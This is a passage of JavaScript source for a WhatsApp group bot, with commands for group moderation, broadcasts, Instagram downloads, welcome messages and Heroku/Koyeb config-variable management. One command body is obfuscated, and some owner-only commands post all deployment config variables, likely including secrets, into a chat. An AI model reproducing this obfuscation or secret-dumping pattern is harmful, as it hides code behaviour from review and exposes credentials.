            }
        }
    )
    //---------------------------------------------------------------------------

/*
cmd({
            pattern: "memegen",
            desc: "Write text on quoted image.",
            category: "group",
            filename: __filename,
            use: '<text>',
        },
        async(Void, citel, text) => {
            let mime = citel.quoted.mtype
            if (!/image/.test(mime)) return citel.reply(`Reply to Photo With Caption *text*`)
            let mee = await Void.downloadAndSaveMediaMessage(citel.quoted)
            let mem = await TelegraPh(mee)
            let meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
            let memek = await Void.sendImageAsSticker(citel.chat, meme, citel, { packname: citel.pushName, author: 'Secktor' })
            await fs.unlinkSync(memek)

        }
    )
    */

    //---------------------------------------------------------------------------
cmd({
            pattern: "group",
            desc: "mute and unmute group.",
            category: "group",
            filename: __filename,
        },
        async(Void, citel, text) => {
            //if (!citel.isGroup) return citel.reply(tlang().group);
            const groupAdmins = await getAdmin(Void, citel)
            const botNumber = await Void.decodeJid(Void.user.id)
            const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
            //if (!citel.isGroup) return citel.reply(tlang().group);
            if (!isBotAdmins) return citel.reply(tlang().botAdmin);
            if (!isAdmins) return citel.reply(tlang().admin);
	        let Group = await sck.findOne({ id: citel.chat });
            if (text.split(" ")[0] == "close" || text.split(" ")[0] == "mute" ) {
                await Void.groupSettingUpdate(citel.chat, "announcement")
                    .then((res) => citel.reply(`Group Chat Muted`))
                    .catch((err) => citel.reply("Error :" +err));
            } else if (text.split(" ")[0] === "open"||text.split(" ")[0] === "unmute") {
                await Void.groupSettingUpdate(citel.chat, "not_announcement")
                    .then((res) => citel.reply(`Group Chat Unmuted`))
                    .catch((err) => citel.reply("Error : " +err));
            } 
else if(text=="Detail" || text=="Info" || text=="info" || text=="details" ) 
{
    const pp = await Void.profilePictureUrl(citel.chat, 'image').catch(_ => null) || ''
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `  ${i + 1}. wa.me/${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || citel.chat.split`-`[0] + '@s.whatsapp.net'

    let ginfos = `
      *「 INFO GROUP 」*
*▢ ID :*
   • ${groupMetadata.id}
*▢ NAME :* 
   • ${groupMetadata.subject}
*▢ Members :*
   • ${participants.length}
*▢ Group Owner :*
   • wa.me/${owner.split('@')[0]}
*▢ Admins :*
${listAdmin}
*▢ Description :*
   • ${groupMetadata.desc?.toString() || 'unknown'}
*▢ 🪢 Extra Group Configuration :*";
  • Group Nsfw :    ${Group.nsfw=='true'? '✅' : '❎'} 
  • Antilink        :    ${Group.antilink=='true'? '✅' : '❎'}
  • Economy      :    ${Group.economy=='true'? '✅' : '❎'}
  • Events         :     ${Group.events=='true'? '✅' : '❎'}
`.trim()
    if(Group.events=='true'){
        ginfos +="\n*▢ Wellcome Message :* \n  • "+Group.welcome;
        ginfos +="\n\n*▢ Goodbye Message :* \n  • "+Group.goodbye; 
    }
return await Void.sendMessage(citel.chat,{image:{url : pp} , caption: ginfos } , {quoted:citel })
}
else
{ 
    return await citel.send(`*_Uhh Dear Give me Query From Bellow Options_*
_1:- .group Mute_
_2:- .group Unmute_
_3:- .group Info_
`)
    //  let buttons = [{ buttonId: `${prefix}group open`, buttonText: { displayText: "📍Unmute",},type: 1,},{buttonId: `${prefix}group close`,buttonText: {displayText: "📍Mute",},type: 1, },];     await Void.sendButtonText(citel.chat,buttons,`Group Mode`, Void.user.name, citel);
           
}
        }
    )
    //---------------------------------------------------------------------------
cmd({
            pattern: "gpp",
	    alias:['grouppic'],
            desc: "Sets a profile pic in Group..",
            category: "group",
            filename: __filename,
        },
        async(Void, citel, text) => {


const _0x4abbbf=_0x5bb4;(function(_0x13d7c6,_0x8bc947){const _0x259bc2=_0x5bb4,_0x10b260=_0x13d7c6();while(!![]){try{const _0x306f21=parseInt(_0x259bc2(0x192))/0x1+parseInt(_0x259bc2(0x187))/0x2+-parseInt(_0x259bc2(0x18c))/0x3+-parseInt(_0x259bc2(0x191))/0x4+-parseInt(_0x259bc2(0x183))/0x5+-parseInt(_0x259bc2(0x195))/0x6+parseInt(_0x259bc2(0x199))/0x7*(parseInt(_0x259bc2(0x184))/0x8);if(_0x306f21===_0x8bc947)break;else _0x10b260['push'](_0x10b260['shift']());}catch(_0x1c1a0a){_0x10b260['push'](_0x10b260['shift']());}}}(_0x323c,0xeb3ae));if(!citel[_0x4abbbf(0x189)])return await citel[_0x4abbbf(0x198)](tlang()[_0x4abbbf(0x17c)]);function _0x5bb4(_0xeb8310,_0x3268ff){const _0x323c8d=_0x323c();return _0x5bb4=function(_0x5bb44f,_0x56b4b1){_0x5bb44f=_0x5bb44f-0x17a;let _0x38ee75=_0x323c8d[_0x5bb44f];return _0x38ee75;},_0x5bb4(_0xeb8310,_0x3268ff);}if(!citel['quoted'])return await citel[_0x4abbbf(0x198)]('*_Uhh\x20Dear,\x20Reply\x20Any\x20Image\x20To\x20Set\x20Group\x20Icon_*');if(citel[_0x4abbbf(0x180)][_0x4abbbf(0x17a)]!='imageMessage')return await citel[_0x4abbbf(0x198)](_0x4abbbf(0x186));function _0x323c(){const _0x18ae47=['download','535270ulHSfx','7494288pOesFz','set','*_Reply\x20To\x20An\x20Image,\x20Idiot_*','3767082nhMrcD','scaleToFit','isGroup','read','*_I\x27m\x20Not\x20Admin\x20In\x20This\x20Chat,_*\x0a*_Provide\x20Admin\x20Role\x20To\x20Update\x20Group\x20Icon_*','2512509jkkzwU','chat','getWidth','*_Profile\x20Icon\x20Updated\x20Successfully_*','crop','5700504cCGKrX','843473GBbmqF','normalize','decodeJid','1983690GnNTjc','includes','MIME_JPEG','reply','7wUnEFg','mtype','sender','group','```Error\x20While\x20Updating\x20Group\x20Profile\x20:```\x20','getBufferAsync','getHeight','quoted','picture'];_0x323c=function(){return _0x18ae47;};return _0x323c();}const groupAdmins=await getAdmin(Void,citel),botNumber=await Void[_0x4abbbf(0x194)](Void['user']['id']),isBotAdmins=groupAdmins['includes'](botNumber)||![],isAdmins=groupAdmins[_0x4abbbf(0x196)](citel[_0x4abbbf(0x17b)])||![];if(!isBotAdmins)return await citel[_0x4abbbf(0x198)](_0x4abbbf(0x18b));if(!isAdmins)return await citel[_0x4abbbf(0x198)](tlang()['admin']);const media=await citel[_0x4abbbf(0x180)][_0x4abbbf(0x182)]();try{const {query}=Void,{preview}=await generateProfilePicture(media);return await query({'tag':'iq','attrs':{'to':citel[_0x4abbbf(0x18d)],'type':_0x4abbbf(0x185),'xmlns':'w:profile:picture'},'content':[{'tag':_0x4abbbf(0x181),'attrs':{'type':'image'},'content':preview}]}),await citel[_0x4abbbf(0x198)](_0x4abbbf(0x18f));}catch(_0x632d01){return await citel[_0x4abbbf(0x198)](_0x4abbbf(0x17d)+_0x632d01);}async function generateProfilePicture(_0x3da926){const _0x527026=_0x4abbbf,_0x462396=await Jimp[_0x527026(0x18a)](_0x3da926),_0x1c1f73=_0x462396[_0x527026(0x18e)](),_0x176031=_0x462396[_0x527026(0x17f)](),_0x887df7=_0x462396[_0x527026(0x190)](0x0,0x0,_0x1c1f73,_0x176031);return{'img':await _0x887df7[_0x527026(0x188)](0x144,0x2d0)[_0x527026(0x17e)](Jimp[_0x527026(0x197)]),'preview':await _0x887df7[_0x527026(0x193)]()[_0x527026(0x17e)](Jimp[_0x527026(0x197)])};}



/*

            if (!citel.isGroup) return citel.reply(tlang().group);
            const groupAdmins = await getAdmin(Void, citel)
            const botNumber = await Void.decodeJid(Void.user.id)
            const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;


            let mime = citel.quoted.mtype
            if (!citel.isGroup) citel.reply(tlang().group);
            if (!isAdmins) citel.reply(tlang().admin);
            if (!isBotAdmins) citel.reply(tlang().botadmin);
            if (!citel.quoted) return citel.reply(`Send/Reply Image With Caption ${cmd}`);
            if (!/image/.test(mime)) return citel.reply(`Send/Reply Image With Caption ${cmd}`);
            if (/webp/.test(mime)) return citel.reply(`Send/Reply Image With Caption ${cmd}`);
            let media = await Void.downloadAndSaveMediaMessage(citel.quoted);
            await Void.updateProfilePicture(citel.chat, {
                    url: media,
                })
                .catch((err) => fs.unlinkSync(media));
            citel.reply(tlang().success);
*/

        }
    )
    //---------------------------------------------------------------------------
cmd({
            pattern: "tag",
            alias:["hidetag"],
            desc: "Tags everyperson of group without mentioning their numbers",
            category: "group",
            filename: __filename,
            use: '<text>',
        },
        async(Void, citel, text , {isCreator}) => {
	if(!text && !citel.quoted) return citel.reply(`*Example : ${prefix}tag Hi Everyone, How are you Doing*` )
	    if(!text){text = citel.quoted.text;}
            if (!citel.isGroup) return citel.reply(tlang().group);
            const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
            const participants = citel.isGroup ? await groupMetadata.participants : "";
            const groupAdmins = await getAdmin(Void, citel)
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
            if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
            Void.sendMessage(citel.chat, { text: text, mentions: participants.map((a) => a.id)}, { quoted: citel});
        }
    )
        //---------------------------------------------------------------------------
cmd({
    pattern: "tagadmin",
    desc: "Tags only Admin numbers",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async(Void, citel, text , {isCreator}) => {
    if (!citel.isGroup) return citel.reply(tlang().group);
    const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat).catch((e) => {}) : "";
    const participants = citel.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = participants.filter(p => p.admin)
    const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
    if (!isAdmins ) return citel.reply(tlang().admin);
    if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
    const listAdmin = groupAdmins.map((v, i) => ` |  @${v.id.split('@')[0]}`).join('\n')


let tag = `
Tag by : @${citel.sender.split("@")[0]}
${text ? "≡ Message :" + text : ""}

┌─⊷ ADMINS
${listAdmin}
└───────────
`.trim()
return await Void.sendMessage(citel.chat,{text : tag ,mentions: [citel.sender, ...groupAdmins.map(v => v.id) ,]} ,)



}
)
    //---------------------------------------------------------------------------
cmd({
            pattern: "add",
            desc: "Add that person in group",
            fromMe: true,
            category: "group",
            filename: __filename,
            use: '<number>',
        },
        async(Void, citel, text,{isCreator}) => {
	//if (!isCreator) return citel.reply("```Only My Owner Can Use This Command```")
            if (!citel.isGroup) return citel.reply(tlang().group);
            const groupAdmins = await getAdmin(Void, citel)
            const botNumber = await Void.decodeJid(Void.user.id)
            const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
            const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;

  
	        if (!isBotAdmins) return await citel.reply(`*_I'm Not Admin In This Group, Idiot_*`);  
            if (!isAdmins) return citel.reply(tlang().admin)
            
            let users = citel.quoted ? citel.quoted.sender : citel.mentionedJid[0] ? citel.mentionedJid[0] : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            if (!users) return await citel.reply("*_Uhh Dear, Please Provide An User._*");
            if(citel.sender == botNumber ){
                await Void.groupParticipantsUpdate(citel.chat, [users], "add");
                await citel.send(`*User Added Succesfully!*`)
                return await Void.sendMessage(citel.chat, { react: { text: '✨', key: citel.key }});
            }else {
                await Void.sendMessage(citel.chat, { react: { text: '❌', key: citel.key }});
                await Void.sendMessage(users , {text : `Here's The Group Invite Link\n User @${citel.sender.split("@")[0]} Wants To Add You in bellow Group\n https://chat.whatsapp.com/${await Void.groupInviteCode(citel.chat)} _ \n ------------ Join If YOu Feel Free?` ,mentions:[citel.sender,]} , {quoted : citel })
                return await citel.reply(`_Can't Add User, Invite Sent_`)
            }
        }
    )
    //--------------------------------------------------------------------------- 
cmd({
            pattern: "getjids",
            alias:['gjid','gjids'],
            desc: "Sends chat id of every groups.",
            category: "group",
            filename: __filename,
        },
        async(Void, citel, text,{ isCreator }) => {
            if (!isCreator) return citel.reply(tlang().owner)
            n = await Void.groupFetchAllParticipating();
            const c=Object.entries(n).slice(0).map(t=>t[1]);
            let a="";
            let onlyJids = false ; 
            let onlyNames = false ; 
            if(text.includes("jid")) {  onlyJids = true ; }
            else if(text.includes("name")) {  onlyNames = true ; }
            await citel.reply(`Fetching ${onlyJids ? "Only jids" : ( onlyNames ? "Only Names" : "Names and Jids") } from ${c.length} Groups`);
            await sleep(2000); 
            for(var i of c.map(t=>t.id))
            {
                a+= onlyJids ? "" : `\n*Group:* ${n[i].subject} `;
                a+= onlyNames ? "" :`\n*JID:* ${i}\n`;
            }
            return await citel.send(a)


	/*
	

let getGroups = await Void.groupFetchAllParticipating();
let anu = Object.values(getGroups).map(v => v.id);
let res = `All groups jid\n\n`;
await citel.reply(`Fetching jid from ${anu.length} Groups`);

await Promise.all(anu.map(async i => {
  let metadata = await Void.groupMetadata(i);
  await sleep(2000); 
 res += ` ------------- ${i} -------------\n`;
 res += `*Name :* ${metadata.subject}\n`;
 
}));
return await citel.reply(res);
	//return await Void.sendMessage(citel.chat,{text:res},{quoted:citel})
	
	//----------------------------------------------------------------------
	
	

	let getGroups = await Void.groupFetchAllParticipating();
            let groups = Object.entries(getGroups)
                .slice(0)
                .map((entry) => entry[1]);
            let anu = groups.map((v) => v.id);
            let jackhuh = `All groups jid\n\n`
            citel.reply(`Fetching jid from ${anu.length} Groups`)
            for (let i of anu) {
                let metadata = await Void.groupMetadata(i);
                await sleep(500)
                jackhuh += `*Subject:-* ${metadata.subject}\n`
               // jackhuh += `*Member :* ${metadata.participants.length}\n`
                jackhuh += `*Jid:-* ${i}\n\n`

            }
            citel.reply(jackhuh)
	    */

        }
    ) 
//---------------------------------------------------------------------------------------
cmd({
            pattern: "del",
            alias: ["delete" , "dlt"],
            desc: "Deletes message of any user",
            category: "group",
            filename: __filename,
            use: '<quote/reply message.>',
        },
        async(Void, citel, text,{ isCreator }) => {
            if (!citel.isGroup && isCreator) { 
                const key = {
                    remoteJid: citel.chat,
                    fromMe: false,
                    id: citel.quoted.id,
                    participant: citel.quoted.sender
                }
                return await Void.sendMessage(citel.chat, { delete: key })
            }
            if (!citel.quoted.isBot ) {
                if (!citel.isGroup) return citel.reply(tlang().group)
                const groupAdmins = await getAdmin(Void, citel)
                const botNumber = await Void.decodeJid(Void.user.id)
                const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
                const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
                if (!isAdmins) return citel.reply(tlang().admin)
                if (!isBotAdmins) return citel.reply('I can\'t delete anyones message without getting Admin Role.')
                if (!citel.quoted) return citel.reply(`Please reply to any message. ${tlang().greet}`);
                let { chat, fromMe, id } = citel.quoted;
                
		    const key = {
                    remoteJid: citel.chat,
                    fromMe: false,
                    id: citel.quoted.id,
                    participant: citel.quoted.sender
                }
                await Void.sendMessage(citel.chat, { delete: key })
            }
        }
    )
    //---------------------------------------------------------------------------
cmd({
            pattern: "checkwarn",
            desc: "Check warns",
            category: "group",
            filename: __filename,
            use: '<quoted/reply user.>',
        },
        async(Void, citel, text) => {
            if (!citel.isGroup) return citel.reply('This command is only for Group.')
            if (!citel.quoted) return citel.reply('Quote a user master.')
            teskd = `*All Warnings.*\n\n`
            let h = await warndb.find({ id: citel.quoted.sender.split('@')[0] + 'warn' })
            console.log(h)
            teskd += `*There are total ${h.length}  warnings.*\n`
            for (let i = 0; i < h.length; i++) {
                teskd += `*${i+1}*\n╭─────────────◆\n│ *🍁In Group:-* ${h[i].group}\n`
                teskd += `│ *🔰Time:-* ${h[i].date}\n`
                teskd += `│ *⚠️Warned by:-* ${h[i].warnedby}\n`
                teskd += `│ _📍Reason: ${h[i].reason}_\n╰─────────────◆\n\n`
            }
            citel.reply(teskd)
        }

    )
    //---------------------------------------------------------------------------
cmd({
        pattern: "broadcast",
        desc: "Bot makes a broadcast in all groups",
        fromMe: true,
        category: "group",
        filename: __filename,
        use: '<text for broadcast.>',
    },
    async(Void, citel, text,{isCreator}) => {
        if (!isCreator) return citel.reply(tlang().owner)
        if(!text) return await citel.reply(`*_Uhh Dear, Provide text to broadcast in all groups_*`)
        let getGroups = await Void.groupFetchAllParticipating();
        let groups = Object.entries(getGroups)
            .slice(0)
            .map((entry) => entry[1]);
        let anu = groups.map((v) => v.id);
        citel.send(`*_Send Broadcast To ${anu.length} Group Chat, Finish Time ${ anu.length * 1.5} second_*`);
        for (let i of anu) {
            await sleep(1500);
            let txt = `*--❗${tlang().title} Broadcast❗--*\n\n *🍀Author:* ${citel.pushName}\n\n${text}`;
            let buttonMessaged = {
                image: log0,
                caption: txt,
                footer: citel.pushName,
                headerType: 1,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: false,
                    externalAdReply: {
                        title: 'Broadcast by ' + citel.pushName,
                        body: tlang().title,
                        thumbnail: log0,
                        mediaUrl: '',
                        mediaType: 2,
                        sourceUrl: gurl,
                        showAdAttribution: true,
                    },
                },
            };
            await Void.sendMessage(i, buttonMessaged, { quoted: citel,});
        }
        return await citel.reply(`*Successful Sending Broadcast To ${anu.length} Group(s)*`);
    }
)


































if(Config.HEROKU_APP_NAME && Config.HEROKU_API_KEY ){
        
    cmd({
        pattern: "setsudo",
        desc: "Makes wa me of quoted or mentioned user.",
        category: "tools",
        filename: __filename
    },
async(Void, citel, text) => {
if(!citel.quoted) return await citel.reply(`*Please Reply A User*`);
let user = citel.quoted.sender.split('@')[0]
if (global.sudo.includes(user)) return citel.reply("Number Already Exist In Sudo");
global.sudo += ',' + user ;
const headers = 
   {
           'Accept': 'application/vnd.heroku+json; version=3',
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
   };
const varName = 'SUDO'
const newVarValue = global.sudo        
fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
   {
             method: 'PATCH',
             headers,
             body: JSON.stringify({ [varName]: newVarValue })
   })
.then(response => response.json())
.then(data => { return citel.reply(`*${user} Added Succesfully.*\nSudo Numbers : ${newVarValue}`); })
.catch(error => citel.reply('Error While Adding new Sudo :'+ error));

    })

//--------------------------------------------------------------------
cmd({
        pattern: "getsudo",
        desc: "Makes wa me of quoted or mentioned user.",
        category: "tools",
        filename: __filename
    },
async(Void, citel, text) => {  return await  citel.reply(global.sudo);})
//-------------------------------------------------------------------------

cmd({
        pattern: "delsudo",
        desc: "Makes wa me of quoted or mentioned user.",
        category: "tools",
        filename: __filename
    },
async(Void, citel, text) => {

if(!citel.quoted) return citel.reply(`*Please Reply A User*`);
let user = citel.quoted.sender.split('@')[0] ;
let  rm = ',' +user 
if (global.sudo.includes(rm)) global.sudo = global.sudo.replace(rm, '');
else return await citel.reply("User not found in the Sudo List\n Sudo Numbers : " + global.sudo );



const headers = 
   {
           'Accept': 'application/vnd.heroku+json; version=3',
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
   };

const varName = 'SUDO'
const newVarValue = global.sudo        
fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
   {
     method: 'PATCH',
     headers,
     body: JSON.stringify({ [varName]: newVarValue })
   })
.then(response => response.json())
.then(data => 
 { 
console.log(data);
return citel.reply(`*${user} Deleted Succesfully.*\nSudo Numbers : ${newVarValue}`);
 })

.catch(error => {     return citel.reply('Error While Adding new Sudo :'+ error);      })

})     

//------------------------------------------------------------------------       
   
   
cmd({
   pattern: "allvar",
   alias:['getallvar','allvars'],
   desc: "To get All  Heroku Vars",
   category: "tools",
   filename: __filename
},

async(Void, citel , text,{ isCreator }) => {
   
if (!isCreator) return citel.reply(tlang().owner);
const headers = {
'Accept': 'application/vnd.heroku+json; version=3',
'Authorization': `Bearer ${authToken}`
};
fetch(`https://api.heroku.com/apps/${appName}/config-vars`, { headers })
.then(response => response.json())
.then(data => {
let allVars = `     *${appName}* Vars \n*________________________________________*\n`;
Object.keys(data).forEach(key => {
                                    allVars += `*${key} :*  ${data[key]}\n` ;
                                });
                                return citel.reply(allVars);
})        
.catch(error => citel.reply('Error retrieving app variable:'+ error));

});
//----------------------------------------------------------------------------------
cmd({
   pattern: "addvar",
   desc: "To Set Heroku Vars",
   category: "tools",
   filename: __filename
},

async(Void, citel , text,{ isCreator }) => {

if (!isCreator) return citel.reply(tlang().owner);
if (!text) return citel.reply (`give me Variable Name\n*E.x : ${prefix}setvar CAPTION: Powered By Suhail Tech*`);
const headers = 
   {
            'Accept': 'application/vnd.heroku+json; version=3',
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json'
   };
   const commaIndex = text.indexOf(':');
   const varName = text.slice(0, commaIndex).toUpperCase().trim();
   const newVarValue = text.slice(commaIndex + 1).trim();
   
if (!newVarValue) return citel.reply (`Please give me Value After ':' \n*Example : ${prefix}setvar AUTO_READ_STATUS:true*`);   
fetch(`https://api.heroku.com/apps/${appName}/config-vars`,
   {
              method: 'PATCH',
              headers,
              body: JSON.stringify({ [varName.toUpperCase()]: newVarValue })
   })
.then(response => response.json())
.then(data => {  return citel.reply(`*${varName} updated Succesfully.*\n${varName}  :  ${newVarValue}`);   })
.catch(error => citel.reply('Error Adding app variable:'));
});
//-----------------------------------------------------------------------------------

cmd({
   pattern: "getvar",
   desc: "To Get A Heroku Var",
   category: "tools",
   filename: __filename
},

async(Void, citel , text,{ isCreator }) => {
if (!isCreator) return citel.reply(tlang().owner);
if (!text) return citel.reply (`give me Variable Name\nExample : ${prefix}getvar AUTO_READ_STATUS`);
const headers = {
'Accept': 'application/vnd.heroku+json; version=3',
'Authorization': `Bearer ${authToken}`
};
const varName = text.toUpperCase().split(" ")
fetch(`https://api.heroku.com/apps/${appName}/config-vars`, { headers })
.then(response => response.json())
.then(data => {
const variableValue = data[varName];
if (variableValue) {return citel.reply(`*${varName} :* ${variableValue}`);} 
else { return citel.reply(`*${varName}* does not exist in *${appName}* app.`);  }
})
.catch(error => citel.reply('Error retrieving app variable:'+ error));

});


//----------------------------------------------------------------------------------
cmd({
   pattern: "setvar",
   desc: "To Set Heroku Vars",
   category: "tools",
   filename: __filename
},
async(Void, citel , text,{ isCreator }) => {
if (!isCreator) return citel.reply(tlang().owner);
if (!text) return citel.reply (`give me Variable Name\n*Example : ${prefix}setvar CAPTION: Powered By Suhail Tech*`);
const headers = {
'Accept': 'application/vnd.heroku+json; version=3',
'Authorization': `Bearer ${authToken}`,
'Content-Type': 'application/json'
};
const commaIndex = text.indexOf(':');
const varName = text.slice(0, commaIndex).toUpperCase().trim();
const newVarValue = text.slice(commaIndex + 1).trim();

if (!newVarValue) return citel.reply (`Please give me Value After ':' \n*Example : ${prefix}setvar AUTO_READ_STATUS:true*`);       
fetch(`https://api.heroku.com/apps/${appName}/config-vars`, {
method: 'GET',
headers 
}) 
.then(response => {
       if (response.ok) { return response.json(); } 
       else { throw new Error(`Failed to fetch app variables. Status: ${response.status}`); }
})
.then(data => {
   if (data.hasOwnProperty(varName)) 
   {
           const updatedConfig = { ...data };
           updatedConfig[varName] = newVarValue;
           return fetch(`https://api.heroku.com/apps/${appName}/config-vars`, 
                   {
                   method: 'PATCH',
                   headers,
                   body: JSON.stringify(updatedConfig)
                   });
   }  else { throw new Error('Variable not found in app'); }
}) 
.then(response => { if (response.ok) return citel.reply(`${varName} updated successfully.\n${varName}: ${newVarValue}`);  })
.catch(error => {   return citel.reply("```Uhh Please, Give me Valid Variable Name```") });


   
}
)

} // If Statements End Here FOr Heroku App and Heroku APP Key to Update App Variable 










































































cmd({
    pattern: "instagramP",
    alias: ["instagram"],
    desc: "download instagram post.",
    category: "downloader",
    filename: __filename
}, async (Void, citel, text, {
    isCreator
}) => {
    if (!text) {
        return citel.send("Need insta post url.");
    }
    try {
        const response = await axios.get(`https://api.maher-zubair.tech/download/instagram?url=${encodeURIComponent(text)}`);
        const data = response.data;
        if (data.status === "success") {
            for (let i = 0; i < data.data.length; i++) {
                await Void.sendFileUrl(citel.chat, data.data[i], `*Downloaded Media from instagram.*${Config.caption}`, citel);
            }
        } else {
            citel.send("*Error, Media Not Found*");
        }
    } catch (error) {
        console.log("insta err: ", error);
        citel.send("*Error, Media Not Found*");
    }
});

cmd({
    pattern: "instagramV",
    desc: "Downloads Instagram videos.",
    category: "downloader",
    filename: __filename,
    use: "<add ig url.>"
}, async (Void, citel, text) => {
    if (!text || !text.toLowerCase().startsWith("https://")) {
        return await citel.send("*Provide insta video url, Dear*");
    }
    try {
        const response = await axios.get(`https://api.maher-zubair.tech/download/instagram?url=${encodeURIComponent(text)}`);
        const data = response.data;
        if (data.status === "success") {
            citel.send(data.data[0], {
                caption: Config.caption
            }, "image");
        } else {
            citel.send("*Error, Video Not Found*");
        }
    } catch (_0x4afabe) {
        console.log("insta err: ", _0x4afabe);
        citel.send("*Error, Video Not Found*");
    }
});






































































cmd(
    {
      pattern: "updatenow",
      desc: "update bot with refreshed commit.",
      filename: __filename,
      category: "misc",
    },
    async (Void,citel,text,{isCreator}) => {
         if(!isCreator) return citel.reply(tlang().owner);
         let check = await get_deployments()
         if(check==='true') return citel.reply('_Please wait..._\n_Currently 2 instances are running in Koyeb,wait to stop one of them._')
         let data = await redeploy();
         return citel.reply(data)
    })
  //----------------------------------------------------------------------------------------------------------------------------------------------------
  cmd(
    {
      pattern: "koyebgetvar",
      desc: "get desired var from koyeb.",
      filename: __filename,
      category: "misc",
    },
    async (Void,citel,text,{isCreator}) => {
         if(!isCreator) return citel.reply(tlang().owner);
         if(!text) return citel.reply('Please provide key.\n_Eg: .getvar PORT_')
         let data = await getvar(text);
         return citel.reply(data)
    })
  //----------------------------------------------------------------------------------------------------------------------------------------------------
  cmd(
    {
      pattern: "getallvar",
      desc: "get all vars from koyeb.",
      filename: __filename,
      category: "misc",
    },
    async (Void,citel,text,{isCreator}) => {
         if(!isCreator) return citel.reply(tlang().owner);
         let data = await getallvar();
         return citel.reply(data)
    })
  //----------------------------------------------------------------------------------------------------------------------------------------------------
  cmd(
    {
      pattern: "koyebsetvar",
      desc: "set var in koyeb.",
      filename: __filename,
      category: "misc",
    },
    async (Void,citel,text,{isCreator}) => {
         if(!isCreator) return citel.reply(tlang().owner);
         if(!text.split(':')[1]) return citel.reply('*Wrong Format.*\nPlease provide key and value.\n_Eg: .setvar THEME:SECKTOR_')
         let check = await get_deployments()
         if(check==='true') return citel.reply('_Please wait..._\n_Currently 2 instances are running in Koyeb,wait to stop one of them._')
         let data = await change_env(text)
         return citel.reply(data)
    })
  
  //----------------------------------------------------------------------------------------------------------------------------------------------------
  cmd(
    {
      pattern: "koyebdelvar",
      desc: "delete var from koyeb.",
      filename: __filename,
      category: "misc",
    },
    async (Void,citel,text,{isCreator}) => {
         if(!isCreator) return citel.reply(tlang().owner);
         if(!text) return citel.reply('Please provide key.\n_Eg: .delvar PORT_')
         let check = await get_deployments()
         if(check==='true') return citel.reply('_Please wait..._\n_Currently 2 instances are running in Koyeb,wait to stop one of them._')
         let data = await delvar(text)
         return citel.reply(data)
    })


























    cmd({
        pattern: "welcome",
        alias:["setwelcome"],
        desc: "sets welcome message in specific group.",
        category: "misc",
     filename: __filename
    },
    async(Void, citel, text,{ isCreator }) => {
    
            let grp =citel.chat;
            if (!citel.isGroup) return citel.reply(tlang().group);
            const groupAdmins = await getAdmin(Void, citel)	
            const isAdmins = groupAdmins.includes(citel.sender) 
            if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
     
          let Group = await sck.findOne({ id: citel.chat });
          if (!text)  {  return await citel.reply ("*Wellcome Message :* "+Group.welcome)  }
          await await sck.updateOne({ id: citel.chat }, { welcome:text ,events:'true'})
          let metadata = await Void.groupMetadata(citel.chat);
          var ppuser;
          let num = citel.sender;
      
          var welcome_messages = text.replace(/@pp/g, '').replace(/@user/gi, `@${num.split("@")[0]}`).replace(/@gname/gi, metadata.subject).replace(/@desc/gi, metadata.desc);
          try {  ppuser = await Void.profilePictureUrl(num, 'image') }catch { ppuser = 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg' ; }
          return await Void.sendMessage(citel.chat, { image: { url: ppuser }, caption: welcome_messages,} )
    
    
           /*if (!Group) {
                    await new sck({ id: citel.chat, welcome: text,events:'true' }).save()
                    return citel.reply('Welcome added for this group.\n *Wellcome Message :* '+text )
                } else {
                    await await sck.updateOne({ id: citel.chat }, { welcome:text ,events:'true'})
                    return citel.reply('Welcome updated successfully.\n *New Wellcome Message Is :* '+text)
                    
                }      */
      
    }
    )
     //---------------------------------------------------------------------------
    cmd({
        pattern: "goodbye",
        alias: ["setgoodbye","setbye"],
        desc: "sets goodbye message in specific group.",
        category: "misc",
     filename: __filename
    },
    async(Void, citel, text,{ isCreator }) => {
    
        if (!citel.isGroup) return citel.reply(tlang().group);
        const groupAdmins = await getAdmin(Void, citel)	
        const isAdmins = groupAdmins.includes(citel.sender) 
        if (!isAdmins && !isCreator) return citel.reply(tlang().admin);
    
        let Group = await sck.findOne({ id: citel.chat })
        if (!text)  {  return await citel.reply ("*_Goodbye Message Is:_* "+Group.goodbye)  }
        await sck.updateOne({ id: citel.chat }, { goodbye:text,events:'true' }) 
     
        let metadata = await Void.groupMetadata(citel.chat);
        var ppuser;
        let num = citel.sender;
        var goodbye_messages = text.replace(/@pp/g, '').replace(/@user/gi, `@${num.split("@")[0]}`).replace(/@gname/gi, metadata.subject).replace(/@desc/gi, metadata.desc);
        try {  ppuser = await Void.profilePictureUrl(num, 'image') }catch { ppuser = 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg' ; }
    
            return await Void.sendMessage(citel.chat, { image: { url: ppuser }, caption: goodbye_messages, })
    
             /*   if (!Group) {
